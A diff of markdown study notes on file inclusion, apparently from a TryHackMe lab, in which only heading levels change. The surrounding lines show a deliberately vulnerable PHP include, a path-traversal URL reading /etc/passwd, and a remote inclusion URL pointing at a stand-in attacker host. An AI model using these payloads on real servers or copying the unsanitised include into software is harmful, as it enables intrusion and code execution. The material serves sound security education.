@@ -29,6 +29,7 @@
 
 ## 🧪 Types of File Inclusion Exploits
 
+### Local File Inclusion (LFI)
 1. Basic LFI (No Directory Constraints)
 <?php 
     include($_GET["lang"]);
@@ -62,7 +63,7 @@ Tricks:
 PoC:
 http://webapp.thm/index.php?lang=languages/../../../../etc/passwd
 
-## 🌐 Remote File Inclusion (RFI)
+### Remote File Inclusion (RFI)
 - Remote File Inclusion (RFI) is a technique to include remote files into a vulnerable application. Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into include function. One requirement for RFI is that the allow_url_fopen option needs to be on.
 - The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Command Execution (RCE) on the server. Other consequences of a successful RFI attack include:
 
@@ -70,7 +71,7 @@ http://webapp.thm/index.php?lang=languages/../../../../etc/passwd
 - Cross-site Scripting (XSS)
 - Denial of Service (DoS)
 
-### How it works
+#### How it works
 The attacker hosts a PHP file on their own server http://attacker.thm/cmd.txt where cmd.txt contains a printing message Hello THM, <?PHP echo "Hello THM"; ?>
 
 - First, the attacker injects the malicious URL, which points to the attacker's server, such as http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt. 
